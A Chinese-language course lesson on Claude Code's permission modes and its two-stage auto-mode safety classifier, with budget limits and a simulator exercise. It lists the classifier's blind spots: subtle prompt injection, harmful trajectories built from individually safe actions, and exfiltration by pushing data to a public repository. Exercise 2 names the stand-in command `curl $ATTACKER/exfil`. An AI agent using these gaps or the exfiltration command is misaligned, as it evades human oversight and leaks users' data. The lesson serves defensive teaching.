# Claude Code 作为自主 Agent：权限模式和自动模式

> Claude Code 公开了七种权限模式。"plan"在每次操作前询问，"default"仅对有风险的操作询问，"acceptEdits"自动批准文件写入但仍确认 shell 执行，"bypassPermissions"批准一切。自动模式（2026 年 3 月 24 日）用两阶段并行安全分类器取代每次操作批准：单次令牌快速检查在每个操作上运行；被标记的操作启动思维链深度审查。操作预算通过 `max_turns` 和 `max_budget_usd` 强制执行。自动模式作为研究预览发布——Anthropic 已明确声明分类器本身不足够。

**类型：** 学习
**语言：** Python（标准库，两阶段分类器模拟器）
**前置条件：** 第 15 阶段 · 01（长程 agent），第 15 阶段 · 09（编码 agent 全景）
**时间：** ~45 分钟

## 问题

你机器上的自主编码 agent 是一个不同的安全类别。攻击面是 agent 能触及的一切——文件系统、网络、凭证、剪贴板、任何浏览器标签、任何打开终端。Bruce Schneier 和其他人已公开标记这一点：计算机使用 agent 不是聊天机器人的"功能更新"，它们是具有新风险特征的新型工具。

Claude Code 的权限系统是 Anthropic 的答案。不是一个"自主/非自主"开关，而是跨越能力阶梯的七种模式：plan → default → acceptEdits → … → bypassPermissions。每种模式是速度和每次操作审查之间的不同权衡。自动模式（2026 年 3 月）添加了一个两阶段分类器，将分类器判断为安全的操作的批准移出用户的关键路径，同时为分类器标记的操作保留审查层。

工程问题：这个系统捕捉什么、错过什么，以及给定任务实际值得哪种模式？

## 概念

### 七种权限模式

| 模式 | 行为 | 何时使用 |
|---|---|---|
| `plan` | Agent 提出计划；用户批准整个计划；每个操作在执行前审查 | 不熟悉的任务；生产相邻代码；首次在仓库上使用 agent |
| `default` | Agent 运行操作；对任何"有风险"操作提示用户（shell 执行、破坏性操作、网络调用） | 大多数交互式编码会话 |
| `acceptEdits` | 文件写入自动批准；shell 执行和网络调用仍提示 | 跨多个文件的重构传递 |
| `acceptExec` | Shell 命令在策划的允许列表内自动批准；写入自动批准 | 每个 shell 命令都是 `npm test` 或类似的紧密内循环 |
| `autoMode` | 两阶段安全分类器；标记的操作提升到审查 | 受限工作空间中的长程无人值守运行 |
| `yolo` | 跳过大多数提示；仍运行工具允许列表/拒绝列表 | 短暂沙箱、CI 作业、研究脚本 |
| `bypassPermissions` | 批准一切 | 记录为"仅在你愿意丢弃的短暂容器内" |

（上面的名称匹配公开 Claude Code 文档；"yolo"是宽松中间地带的非正式简写。）

### 自动模式一页

自动模式（2026 年 3 月 24 日发布）是第一个将每次操作批准委托给模型的权限模式。结构：

1. **阶段 1 — 单次令牌分类器。** 在每个提出的操作上运行。廉价。返回"安全"或"标记"。设计为与主 agent 循环并行运行，因此批准的操作不排队。
2. **阶段 2 — 二级策略/安全审查。** 仅在标记的操作上运行。对操作、会话当前状态和声明任务执行专注的策略和安全评估。如果置信度低则升级到用户 HITL。

预算控制与分类器并列：

- `max_turns` —— 会话中的总迭代次数。
- `max_budget_usd` —— 中止会话的美元上限。
- 每个工具的操作计数限制（不超过 N 次 `WebFetch` 调用等）。

### 系统捕捉什么

- 工具输入中的直接提示注入，其中注入指令映射到已知风险操作形状。
- 重复工具循环——分类器可以看到操作 N+1 几乎与操作 N 相同，连续五次。
- 否则仅限文件编辑的会话上的明显超出范围 shell 命令。

### 系统可能错过什么

- **微妙的提示注入**，在不产生单个标记操作的情况下调节行为。间接提示注入不是完全可修补的漏洞（OpenAI 准备负责人，2025，关于浏览器 agent——见第 11 课）。
- **语义级不当行为。** 每个单独操作可以看起来安全，而组合轨迹是有害的。分类器判断操作；它不重新推导用户意图。
- **通过合法渠道的外泄。** 将数据写入你拥有的文件，然后 `git push` 到公共仓库，是一系列允许操作的组合问题。

### 研究预览框架

Anthropic 将自动模式作为研究预览发布。文档明确说明分类器是一个层，不是解决方案：用户应将自动模式与预算、允许列表、隔离工作空间和轨迹审计结合使用（第 12-16 课）。预览框架还反映了记录的评估与部署差距（第 1 课）——通过离线评估的分类器在真实会话中可能表现不同，其中用户上下文是模糊的。

### 这个阶梯在你工作流中的位置

- 不熟悉的任务：从 `plan` 开始。阅读计划比回滚错误运行更便宜。
- 已知重构：`acceptEdits` 节省大量确认点击。
- 无人值守后台运行：仅在已测量爆炸半径的工作空间内使用 `autoMode`（无凭证、无生产挂载、无未选择的外泄）。
- 短暂容器：当且仅当容器及其凭证可丢弃时，`yolo` / `bypassPermissions` 是可接受的。

## 使用

`code/main.py` 模拟两阶段分类器。阶段 1 是提出的操作上的廉价关键字规则；阶段 2 是较慢的多规则审查器。驱动程序输入一个短合成轨迹（安全操作、提示注入尝试、重复循环）并显示分类器在哪里捕捉和在哪里错过。

## 交付

`outputs/skill-permission-mode-picker.md` 将任务描述匹配到正确的权限模式、预算上限和所需隔离。

## 练习

1. 运行 `code/main.py`。哪种合成操作类型从未被阶段 1 标记但总是被阶段 2 捕捉？哪种两者都捕捉不到？

2. 扩展阶段 1 规则集以捕捉特定已知坏形状（例如 `curl $ATTACKER/exfil`）。测量良性操作样本上的误报率。

3. 阅读 Anthropic 的"How the agent loop works"文档。列出 `default` 模式下 agent 默认触及的每个外部状态。在无人值守运行 `autoMode` 之前，你需要单独限制哪些？

4. 设计一个 24 小时无人值守运行预算：`max_turns`、`max_budget_usd`、每个工具上限、允许列表。证明每个数字。

5. 描述一个轨迹，其中每个单独操作都被阶段 1 和阶段 2 批准，但组合行为是错位的。（第 14 课涵盖终止开关和金丝雀令牌如何解决。）

## 关键术语

| 术语 | 人们怎么说 | 实际含义 |
|---|---|---|
| Permission mode | "Agent 能做多少" | 控制每次操作批准的七种命名策略之一 |
| plan mode | "任何事情前询问" | Agent 写计划；用户在执行前批准 |
| acceptEdits | "让它写文件" | 文件写入自动批准；shell 执行仍提示 |
| autoMode | "自动批准" | 两阶段安全分类器；标记的操作升级 |
| bypassPermissions | "完全 YOLO" | 批准一切；用于短暂容器 |
| Stage 1 classifier | "快速令牌检查" | 提出的操作上的单次令牌规则；并行运行 |
| Stage 2 classifier | "深度审查" | 标记操作上的思维链推理 |
| Research preview | "非 GA" | Anthropic 对仍在映射失败模式的功能的框架 |
